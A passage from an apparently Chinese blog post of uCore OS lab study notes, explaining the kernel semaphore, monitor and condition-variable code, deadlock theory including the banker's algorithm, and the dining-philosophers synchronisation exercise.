class="hljs-keyword">static</span> __noinline <span class="hljs-keyword">uint32_t</span> __down(<span class="hljs-keyword">semaphore_t</span> *sem, <span class="hljs-keyword">uint32_t</span> wait_state) &#123;<br>    <span class="hljs-comment">//realize P operation</span><br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<span class="hljs-comment">//save the interrupt flag</span><br>    <span class="hljs-keyword">if</span> (sem-&gt;value &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//能够获取信号量</span><br>        sem-&gt;value --;<br>        local_intr_restore(intr_flag);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">//无法获得信号量时:</span><br>    <span class="hljs-keyword">wait_t</span> __wait, *wait = &amp;__wait;<br>    wait_current_set(&amp;(sem-&gt;wait_queue), wait, wait_state); <span class="hljs-comment">//加入等待队列</span><br>    local_intr_restore(intr_flag);<span class="hljs-comment">//关中断</span><br><br>    schedule();<span class="hljs-comment">//选择另一个进程执行</span><br><br>    local_intr_save(intr_flag);<span class="hljs-comment">//如果被另一个V操作(up函数)唤醒, 继续执行</span><br>    wait_current_del(&amp;(sem-&gt;wait_queue), wait);<span class="hljs-comment">//从wait队列中删除</span><br>    local_intr_restore(intr_flag);<br><br>    <span class="hljs-keyword">if</span> (wait-&gt;wakeup_flags != wait_state) &#123;<br>        <span class="hljs-keyword">return</span> wait-&gt;wakeup_flags;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-信号量"><a href="#3-信号量" class="headerlink" title="3.信号量"></a>3.信号量</h3><p>信号量的数据结构定义如下:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">int</span> value;                   <span class="hljs-comment">//信号量的当前值</span><br>    <span class="hljs-keyword">wait_queue_t</span> wait_queue;     <span class="hljs-comment">//信号量对应的等待队列</span><br>&#125; <span class="hljs-keyword">semaphore_t</span>;<br></code></pre></div></td></tr></table></figure><p>__up()和__down()的分析在上面.</p><p>对照信号量的原理性描述和具体实现，可以发现二者在流程上基本一致，只是具体实现采用了关中断的方式保证了对共享资源的互斥访问，通过等待队列让无法获得信号量的进程睡眠等待。</p><h3 id="4-管程-monitor-和条件变量"><a href="#4-管程-monitor-和条件变量" class="headerlink" title="4.管程(monitor)和条件变量"></a>4.管程(monitor)和条件变量</h3><blockquote><p><a href="https://kiprey.github.io/2020/09/uCore-7/#5-%E7%AE%A1%E7%A8%8B">原理</a> </p></blockquote><p>ucore中的管程机制是基于信号量和条件变量来实现的。ucore中的管程的数据结构monitor_t定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;<span class="hljs-comment">// the mutex lock for going into the routines in monitor, should be initialized to 1</span><br>    <span class="hljs-comment">// the next semaphore is used to </span><br>    <span class="hljs-comment">//    (1) procs which call cond_signal funciton should DOWN next sema after UP cv.sema</span><br>    <span class="hljs-comment">// OR (2) procs which call cond_wait funciton should UP next sema before DOWN cv.sema</span><br>    <span class="hljs-keyword">semaphore_t</span> next;        <br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped procs which cond_signal funciton</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// the condvars(是一个array) in monitor</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><p>Since a signaling process must wait until the resumed process either leaves or waits, an additional binary semaphore, next, is introduced, initialized to 0. ==The signaling processes can use next to suspend themselves==. An integer variable next count is also provided to count the number of processes suspended on next. </p><p>管程中的条件变量的数据结构condvar_t定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">condvar</span>&#123;</span><br><span class="hljs-comment">// the sem semaphore is used to down the waiting proc, and the signaling proc should up the waiting proc</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;     <br>    <span class="hljs-keyword">int</span> count;       　    <span class="hljs-comment">// the number of waiters on condvar</span><br>    <span class="hljs-keyword">monitor_t</span> * owner;     <span class="hljs-comment">// the owner(monitor) of this condvar</span><br>&#125; <span class="hljs-keyword">condvar_t</span>;<br></code></pre></div></td></tr></table></figure><p>条件变量的定义中也包含了一系列的成员变量，信号量sem用于让发出<code>wait_cv</code>操作的等待某个条件Cond为真的进程睡眠，而让发出<code>signal_cv</code>操作的进程通过这个sem来唤醒睡眠的进程, <strong>可以看出条件变量是信号量的高层封装.</strong> </p><p>要看懂monitor还可以看看他的初始化函数:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Initialize monitor.</span><br><span class="hljs-keyword">void</span>  <span class="hljs-comment">//monitor中的cv其实是一个数组头, 大小是这个函数的num_cv参数, 能存放多个条件变量, 这样方便管程控制</span><br>monitor_init (<span class="hljs-keyword">monitor_t</span> * mtp, <span class="hljs-keyword">size_t</span> num_cv) &#123;<br>    <span class="hljs-keyword">int</span> i;<br>    assert(num_cv&gt;<span class="hljs-number">0</span>);<br>    mtp-&gt;next_count = <span class="hljs-number">0</span>;<br>    mtp-&gt;cv = <span class="hljs-literal">NULL</span>;<br>    sem_init(&amp;(mtp-&gt;mutex), <span class="hljs-number">1</span>); <span class="hljs-comment">//unlocked</span><br>    sem_init(&amp;(mtp-&gt;next), <span class="hljs-number">0</span>);<span class="hljs-comment">//注意到这两个的初始化并不一致, next一开始是空的</span><br>    mtp-&gt;cv =(<span class="hljs-keyword">condvar_t</span> *)kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">condvar_t</span>)*num_cv);<br>    assert(mtp-&gt;cv!=<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;num_cv; i++)&#123;<span class="hljs-comment">//初始化条件变量</span><br>        mtp-&gt;cv[i].count=<span class="hljs-number">0</span>;<br>        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="hljs-number">0</span>);<br>        mtp-&gt;cv[i].owner=mtp;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ucore设计实现了条件变量<code>wait_cv</code>操作和<code>signal_cv</code>操作对应的具体函数，即<code>cond_wait</code>函数和<code>cond_signal</code>函数，此外还有<code>cond_init</code>初始化函数（可直接看源码）</p><p><strong>signal_cv的原理描述</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>( cv.count &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//如果该cv上没有等待的进程, 直接跳过</span><br>   monitor.next_count ++;<span class="hljs-comment">//否则next_count++</span><br>   sem_signal(cv.sem);<span class="hljs-comment">//唤醒队列中第一个进程</span><br>   sem_wait(monitor.next);<span class="hljs-comment">//一开始的时候next.value=0, 当前进程肯定会被挂起并schedule();</span><br>                            <span class="hljs-comment">//后来(???</span><br>   monitor.next_count -- ;<span class="hljs-comment">//被唤醒后就减掉了</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>实际代码是差不多的:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(cvp-&gt;count&gt;<span class="hljs-number">0</span>) &#123;<br>    cvp-&gt;owner-&gt;next_count ++;<br>    up(&amp;(cvp-&gt;sem));<br>    down(&amp;(cvp-&gt;owner-&gt;next));<br>    cvp-&gt;owner-&gt;next_count --;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>wait_cv的原理描述</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cv.count++;<span class="hljs-comment">//等待数量+1</span><br><span class="hljs-keyword">if</span>(monitor.next_count &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">//有大于等于1个进程执行cond_signal函数且sleep</span><br>   sem_signal(monitor.next);<span class="hljs-comment">//唤醒wait_queue第一个进程</span><br><span class="hljs-keyword">else</span><span class="hljs-comment">//没有进程因执行cond_signal而挂起</span><br>   sem_signal(monitor.mutex);<span class="hljs-comment">//解开互斥锁, 好让其他进程进入管程</span><br>sem_wait(cv.sem);<span class="hljs-comment">//当前进程需要等待信号(见下方)</span><br>cv.count --;<br></code></pre></div></td></tr></table></figure><blockquote><p>有一点迷惑的地方在于等待信号是在程序中判断的吗? 看代码确实是这个意思, 到了sem_wait就一定会等待(通过相邻哲学家的情况提前signal_cv, 设置state_condvar, 然后sem_wait都用不着判断cv.sem的value, 肯定是0.</p><p>没有弄清楚什么是必须写在操作系统里的什么是要写在程序中的</p></blockquote><p>实际代码:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cvp-&gt;count++;<br><span class="hljs-keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="hljs-number">0</span>)<br>    up(&amp;(cvp-&gt;owner-&gt;next));<br><span class="hljs-keyword">else</span><br>    up(&amp;(cvp-&gt;owner-&gt;mutex));<br>down(&amp;(cvp-&gt;sem));<br>cvp-&gt;count --;<br></code></pre></div></td></tr></table></figure><h3 id="5-管程中函数的入口出口设计"><a href="#5-管程中函数的入口出口设计" class="headerlink" title="5.管程中函数的入口出口设计"></a>5.管程中函数的入口出口设计</h3><p>为了让整个管程正常运行，还需在管程中的每个函数的入口和出口增加相关操作，即：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">function_in_monitor （…）<br>&#123;<br>  sem.wait(monitor.mutex);<br><span class="hljs-comment">//-----------------------------</span><br>  the real body of function;<br><span class="hljs-comment">//-----------------------------</span><br>  <span class="hljs-keyword">if</span>(monitor.next_count &gt; <span class="hljs-number">0</span>)<br>     sem_signal(monitor.next);<br>  <span class="hljs-keyword">else</span><br>     sem_signal(monitor.mutex);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这样带来的作用有两个，（1）只有一个进程在执行管程中的函数。（2）避免由于执行了cond_signal函数而睡眠的进程无法被唤醒。</p><p>具体是这样工作的: </p><ul><li>如果1号进程进入了临界区, 然后由于某种原因(比如外部中断)而切换到了另一个也要访问管程的进程2号, 那么2号就会在sem.wait()里被挂起来, 并且通过调度最终换到1号继续执行. </li><li>当1号执行到出口时, 他会发现next_count=0, 随后释放mutex锁, 发现1号在等待mutex, 所以将其唤醒, 在下一个中断中, 1号进入睡眠, 2号准备执行. (不一定是紧跟着的, 还要看调度器, 这里只是设置成了RUNNALBE)</li><li>2 号执行到出口时发现next_count=1, 于是up一下信号量next, 最终回到一号继续往下执行.</li></ul><h3 id="6-死锁"><a href="#6-死锁" class="headerlink" title="6.死锁"></a>6.死锁</h3><blockquote><p>不用可惜了(bushi <a href="https://kiprey.github.io/2020/09/uCore-7/#7-%E6%AD%BB%E9%94%81">[link]</a> </p></blockquote><h4 id="a-死锁概念"><a href="#a-死锁概念" class="headerlink" title="a. 死锁概念"></a>a. 死锁概念</h4><h5 id="1-进程访问资源的流程"><a href="#1-进程访问资源的流程" class="headerlink" title="1) 进程访问资源的流程"></a>1) 进程访问资源的流程</h5><ul><li>资源类型R1,R2,…，RmR1,R2,…，Rm: CPU执行时间，内存空间，I/O设备等。</li><li>每类资源RiRi有WiWi个实例</li><li>进程访问资源的流程<ul><li>请求/获取：申请空闲资源</li><li>使用/占用：进程占用资源</li><li>释放：资源状态由占用变成空闲。</li></ul></li></ul><h5 id="2-资源分类"><a href="#2-资源分类" class="headerlink" title="2) 资源分类"></a>2) 资源分类</h5><ul><li>可重用资源（Reusable Resource）<ul><li>资源不能被删除且自任何时刻只能有一个进程在使用</li><li>进程释放资源后，其他进程可重用</li><li>可重用资源示例：硬件如处理器、I/O设备等，软件如文件、数据库等</li><li>可能出现死锁：每个进程占用一部分资源并请求其他资源</li></ul></li><li>消费资源 (Consumable resource)<ul><li>资源创建和销毁</li><li>消耗资源示例：中断、信号、消息</li><li>可能出现死锁：进程间相互等待接收对方的消息</li></ul></li></ul><h5 id="3-出现死锁的必要条件"><a href="#3-出现死锁的必要条件" class="headerlink" title="3) 出现死锁的必要条件"></a>3) 出现死锁的必要条件</h5><ul><li>互斥：任何时刻只能有一个进程使用一个资源实例</li><li>持有并等待：进程保持至少一个资源，并正在等待获取其他进程持有的资源</li><li>非抢占：资源只能在进程使用后自愿释放</li><li>循环等待：进程间相互循环等待</li></ul><h4 id="b-死锁处理方法"><a href="#b-死锁处理方法" class="headerlink" title="b. 死锁处理方法"></a>b. 死锁处理方法</h4><blockquote><p>死锁检测较为复杂，通常由应用程序处理死锁，<strong>操作系统会忽略死锁</strong> </p></blockquote><h5 id="1-死锁预防"><a href="#1-死锁预防" class="headerlink" title="1) 死锁预防"></a>1) 死锁预防</h5><blockquote><p>死锁预防（Deadlock Prevention) ： 确保系统永远不会进入死锁状态。</p></blockquote><p>预防是采用某种策略，<strong>限制</strong>并发进程对资源的请求，使系统在任何时刻都<strong>不满足死锁的必要条件</strong>。</p><ul><li>互斥：把互斥的共享资源封装成可同时访问的</li><li>持有并等待：进程请求资源时，要求它不持有任何其他资源。仅允许进程在开始执行时，一次请求所有需要的资源，但这种做法的资源利用率低。</li><li>非抢占：如进程请求不能立即分配的资源，则释放已经占用的资源。只在能够同时获得所有需要资源时，才执行分配操作。</li><li>循环等待：对资源排序，要求进程按顺序请求资源。</li></ul><h5 id="2-死锁避免"><a href="#2-死锁避免" class="headerlink" title="2) 死锁避免"></a>2) 死锁避免</h5><blockquote><p>死锁避免（Deadlock Avoidance）：在使用前进行判断，只允许不会出现死锁的进程请求资源。</p></blockquote><p>利用额外的先验信息，在分配资源时判断是否会出现死锁，只在不会出现死锁时分配资源。</p><ul><li>要求进程声明需要资源的<strong>最大数目</strong>。</li><li>限定<strong>提供</strong>与<strong>分配</strong>的资源数量，确保满足进程的<strong>最大</strong>需求。</li><li><strong>动态检查</strong>资源分配状态，确保不会出现环形等待。</li></ul><p>系统资源分配的安全状态</p><ul><li>当进程请求资源时，系统判断分配后是否处于安全状态。</li><li>系统处于安全状态：针对所有已占用进程，存在安全序列</li><li>序列&lt;P1,P2,…,PN&gt;是安全的<ul><li>PiPi要求的资源 &lt;= 当前可用资源 + 所有PjPj持有资源。其中<code>j&lt;i</code>。</li><li>如果PiPi的资源请求不能马上分配，则PiPi等待所有Pj(j&lt;i)Pj(j&lt;i)完成</li><li>PiPi完成后，Pi+1Pi+1可得到所需资源，执行并释放所分配的资源。</li><li>最终整个序列的所有PiPi都能获得所需资源。</li></ul></li></ul><p><strong>银行家算法</strong>（Banker’s Algorithm）</p><blockquote><p>银行家算法是一个避免死锁产生的算法，以银行借贷分配策略为基础，判断并保证系统处于安全状态。</p></blockquote><ul><li><p>使用的数据结构</p><blockquote><p>n = 线程数量， m = 资源类型数量</p></blockquote><ul><li>**Max(总需求量)**：n x m 矩阵，线程TiTi最多请求类型RiRi的资源Max[i,j]Max[i,j]个实例</li><li>**Available(剩余空闲量)**：长度为m的向量，当前有Available[i]Available[i]个类型RjRj的资源实例可用</li><li>**Allocation(已分配量)**：n x m 矩阵，线程TiTi当前分配了Allocation[i,j]Allocation[i,j]个RjRj的实例</li><li>**Need(未来需要量)**： n x m矩阵，线程TiTi未来需要Need[i,j]Need[i,j]个RjRj资源实例。</li></ul><blockquote><p>Need[i,j]=Max[i,j]−Allocation[i,j]Need[i,j]=Max[i,j]−Allocation[i,j]</p></blockquote></li><li><p><strong>安全状态判断</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPY<span class="hljs-comment">// Work和Finish分别是长度为m和n的向量初始化</span><br>Work[m], Finish[n];<br><br>Work = Available; <span class="hljs-comment">// 当前资源剩余空闲量</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>  Finish[i] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 线程i没结束</span><br><br><span class="hljs-comment">// ...每个线程开始运行并分配资源</span><br><br><span class="hljs-comment">// 在一段时间后</span><br><span class="hljs-comment">// 寻找Need比Work小，同时还未结束的线程Ti</span><br><span class="hljs-keyword">while</span>(Finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i] &lt;= Work)<br>&#123;<br>    <span class="hljs-comment">// 线程i的资源需求量小于当前剩余空闲资源量，所以该线程可以正常结束，并回收该线程的所有资源</span><br>    Work += Allocation[i];<br>    Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">// 如果所有线程Ti都满足Finish[i] == true,则系统处于安全状态。</span><br><span class="hljs-keyword">if</span>(Finish == <span class="hljs-literal">true</span>)<br>    Safe;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// 反之，系统处于不安全状态。</span><br>    NoSafe;<br></code></pre></div></td></tr></table></figure></li><li><p>银行家算法具体设计</p><ul><li><p>初始化：RequestiRequesti：线程TiTi的资源请求向量， Requesti[j]Requesti[j]：线程TiTi请求资源RjRj的实例</p></li><li><p>循环：</p><ol><li><p>如果Requesti&lt;=Need[i]Requesti&lt;=Need[i]，则转到步骤2。否则拒绝资源申请，因为线程已经超过了其最大资源要求。</p></li><li><p>如果Requesti&lt;=AvailableRequesti&lt;=Available，转到步骤3。否则，TiTi必须等待，因为资源不可用。</p></li><li><p>通过安全状态判断来确定是否分配资源给TiTi</p><ul><li><p>生成一个需要判断状态是否安全的资源分配环境</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPYAvailable = Available - Request_i;<br>Allocation[i] = Allocation[i] + Request_i;<br>Need[i] = Need[i] - Request_i;<br></code></pre></div></td></tr></table></figure></li><li><p>并调用上文的<strong>安全状态判断</strong></p><ul><li>如果返回结果是<strong>安全</strong>，则将资源分配给TiTi</li><li>如果返回结果是<strong>不安全</strong>，系统会拒绝TiTi的资源请求</li></ul></li></ul></li></ol></li></ul></li></ul><h5 id="3-死锁检测和恢复"><a href="#3-死锁检测和恢复" class="headerlink" title="3) 死锁检测和恢复"></a>3) 死锁检测和恢复</h5><blockquote><p>死锁检测和恢复（Deadlock Detection &amp; Recovery） : 在检测到运行系统进入死锁状态后进行恢复。</p></blockquote><ul><li>特点<ul><li>允许系统进入死锁状态</li><li>维护系统的资源分配图</li><li>定期调用死锁检测算法来搜索图中是否存在死锁</li><li>出现死锁时，用死锁恢复机制进行恢复。</li></ul></li></ul><h6 id="i-死锁检测"><a href="#i-死锁检测" class="headerlink" title="i. 死锁检测"></a>i. 死锁检测</h6><ul><li><p>数据结构</p><ul><li>**Available(剩余空闲量)**：长度为m的向量，每种类型可用资源的数量</li><li>**Allocation(已分配量)**：n x m 矩阵，当前分配给各个进程每种类型资源的数量，进程PiPi拥有资源RiRi的Allocation[i,j]Allocation[i,j]个实例。</li></ul></li><li><p>死锁检测算法</p><blockquote><p>该算法与银行家算法类似。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPY<span class="hljs-comment">// Work和Finish分别是长度为m和n的向量初始化</span><br>Work[m], Finish[n];<br><br>Work = Available; <span class="hljs-comment">// 当前资源剩余空闲量</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>    <span class="hljs-comment">// 如果当前遍历到的线程占用资源，则设置Finish为false</span><br>    <span class="hljs-comment">// 反之，如果当前线程不占用资源，则要么是线程已结束，要么是我们不关心的线程</span><br>    <span class="hljs-keyword">if</span>(Allocation[i] &gt; <span class="hljs-number">0</span>)<br>      Finish[i] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 线程i没结束</span><br>    <span class="hljs-keyword">else</span><br>      Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// ...每个线程开始运行并分配资源</span><br><br><span class="hljs-comment">// 在一段时间后</span><br><span class="hljs-comment">// 寻找Request比Work小，同时还未结束的线程Ti</span><br><span class="hljs-keyword">while</span>(Finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Request[i] &lt;= Work)<br>&#123;<br>    <span class="hljs-comment">// 线程i的资源需求量小于当前剩余空闲资源量，所以该线程可以正常结束，并回收该线程的所有资源</span><br>    Work += Allocation[i];<br>    Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">// 如果所有线程Ti都满足Finish[i] == true,则系统处于正常状态</span><br><span class="hljs-keyword">if</span>(Finish == <span class="hljs-literal">true</span>)<br>    NoDeadlock;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// 反之，系统处于死锁状态。</span><br>    Deadlock;<br></code></pre></div></td></tr></table></figure></li><li><p>死锁检测算法的使用</p><ul><li>死锁检测的时间和周期选择依据<ul><li>死锁多久可能会发生</li><li>多少进程需要被回滚</li></ul></li><li>资源图可能有多个循环，难以分辨”造成“死锁的关键进程</li></ul></li></ul><h6 id="ii-死锁恢复"><a href="#ii-死锁恢复" class="headerlink" title="ii. 死锁恢复"></a>ii. 死锁恢复</h6><ul><li>进程终止<ul><li>终止所有的死锁线程</li><li>一次只终止一个进程直到死锁消除</li><li>终止进程的顺序应该是<ul><li>进程的优先级: 通常是优先级低的</li><li>进程已运行时间以及还需运行时间: 希望运行时间短的</li><li>进程已占用资源: 占用资源少的</li><li>进程完成需要的资源</li><li>终止进程数目: 自然是越小越好</li><li>进程是交互式还是批处理: 通常是用户交互进程</li></ul></li></ul></li><li>资源抢占<ul><li>选择被抢占进程：最小成本目标</li><li>进程回退：返回到一些安全状态，重启进程到安全状态</li><li>可能会出现饥饿：同一个进程可能一直被选作被抢占者</li></ul></li></ul><h2 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-4"><a href="#练习1-4" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题</p></blockquote><p>信号量的实现在知识点中有分析. 这里写哲学家就餐问题检查函数的实现和信号量的联系.</p><p>在kern\sync\check_sync.c中有check_sync()函数, 分为使用 信号量的检查 以及 管程的检查, 拿前者说明, 该种检查调用<code>sem_init(&amp;mutex, 1)</code>初始化mutex, 需要设置下面这几个变量存储必要信息. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> state_sema[N]; <span class="hljs-comment">/* 记录每个人状态的数组 */</span><br><span class="hljs-keyword">semaphore_t</span> mutex; <span class="hljs-comment">/* 临界区互斥 */</span><br><span class="hljs-keyword">semaphore_t</span> s[N]; <span class="hljs-comment">/* 每个哲学家一个信号量, 表示是否得到了叉子 */</span><br></code></pre></div></td></tr></table></figure><p>然后创建五个内核线程, 线程调用的函数为philosopher_using_[semaphore, monitor], 进入一个总共4次的循环. </p><p>每次循环就是重复思考, 取叉, 进餐, 放叉几个动作, 模拟进程使用资源的几种操作.</p><p>比如取叉会调用<code>phi_take_forks_sema()</code>函数, </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_take_forks_sema</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">/* i：哲学家号码从0到N-1 */</span></span><br><span class="hljs-function"></span>&#123; <br>        down(&amp;mutex); <span class="hljs-comment">/* 进入临界区 */</span><br>        state_sema[i]=HUNGRY; <span class="hljs-comment">/* 记录下哲学家i饥饿的事实 */</span><br>        phi_test_sema(i); <span class="hljs-comment">/* 试图得到两只叉子 */</span><br>        up(&amp;mutex); <span class="hljs-comment">/* 离开临界区 */</span><br>        down(&amp;s[i]); <span class="hljs-comment">/* 如果得不到叉子就阻塞 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>这是一个互斥的资源请求, <del>我认为该函数可以理解为这就相当于进程使用一种系统调用, 在操作系统层面进行进入和离开临界区的操作.</del> ==好吧信号量这种方法其实是需要程序员写出来的.==</p><ul><li>先是临界区互斥信号量mutex的P操作(实现在知识点2里), 同一时间只能有一个哲学家进入临界区</li><li>然后试图得到两只叉子还要查看左边右边哲学家是否在EATING状态, 得到了就进行该哲学家信号量s[i]的V操作, 表示取到了叉子</li><li>最后一句就是如果没取到叉子又进行了P操作, 这时候肯定就阻塞了, 这时候会进行schedule(), 切换到其他进程<ul><li>这一步有点特别, 因为要在临界区内进行一次V操作, 然后在外面进行一次P操作检查刚刚是否进行了V操作.</li></ul></li></ul><p>如果有其他哲学家使用V操作释放了叉子, 就会调用wakeup_wait()来使该信号量的等待队列里的第一个变成RUNNALBLE, 所有使用这种资源的进程只有这个能就绪, 如果调度器调度到了这个进程就可以继续进行了.</p><p>接下来进餐sleep 10个时间片, 然后到了放下叉子. 这时候<strong>需要程序员清楚地知道</strong>放下后需要进行的操作, 这里是检查左右邻座是否在HUNGRY状态, 是的话允许他拿起叉子(通过<code>up(&amp;s[i])</code>).</p><p>大概的过程就是这样.</p><h3 id="练习2-4"><a href="#练习2-4" class="headerlink" 